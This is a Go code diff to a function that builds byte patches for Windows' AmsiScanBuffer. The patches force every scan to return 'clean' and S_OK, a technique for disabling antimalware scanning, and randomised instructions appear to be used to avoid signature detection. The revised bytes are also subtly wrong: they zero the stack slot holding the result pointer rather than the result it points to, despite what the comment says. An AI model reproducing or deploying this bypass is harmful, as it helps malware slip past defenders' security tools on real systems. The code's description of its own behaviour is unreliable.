@@ -65,18 +65,35 @@ func randomZeroReg() []byte {
 }
 
 // randomAmsiPatchBytes generates a patch for AmsiScanBuffer.
-// AmsiScanBuffer has 5 parameters; on x64 the 5th (AMSI_RESULT *result)
-// arrives in R9. The patch writes 0 to *R9 (AMSI_RESULT_CLEAN), zeros
-// EAX (HRESULT = S_OK), and returns.
+//
+// AmsiScanBuffer signature (6 parameters):
+//
+//	HRESULT AmsiScanBuffer(
+//	    HAMSICONTEXT amsiContext,   // RCX  (#1)
+//	    PVOID buffer,               // RDX  (#2)
+//	    ULONG length,               // R8   (#3)
+//	    LPCWSTR contentName,        // R9   (#4)
+//	    HAMSISESSION amsiSession,   // [rsp+28h] (#5)
+//	    AMSI_RESULT *result         // [rsp+30h] (#6)
+//	);
+//
+// On x64, only the first 4 params go in registers. The 6th param
+// (AMSI_RESULT *result) is at [rsp+0x30] (offset 0x28 from the
+// return-address frame, plus 8 for the alignment slot = 0x30).
+//
+// The patch writes 0 to *result (AMSI_RESULT_CLEAN), zeros EAX
+// (HRESULT = S_OK), and returns.
 func randomAmsiPatchBytes() []byte {
 	reg := randomZeroReg()
 	patch := make([]byte, patchLen)
-	// mov dword ptr [r9], 0  — write AMSI_RESULT_CLEAN to the out-param
-	patch[0] = 0x41
-	patch[1] = 0xC7
-	patch[2] = 0x01
-	// bytes 3..6 = 0 (immediate dword 0)
-	off := 7
+	// mov dword ptr [rsp+0x30], 0  — write AMSI_RESULT_CLEAN
+	// C7 44 24 30 00 00 00 00
+	patch[0] = 0xC7
+	patch[1] = 0x44
+	patch[2] = 0x24
+	patch[3] = 0x30
+	// bytes 4..7 = 0 (immediate dword 0)
+	off := 8
 	copy(patch[off:], reg)
 	off += len(reg)
 	patch[off] = 0xC3
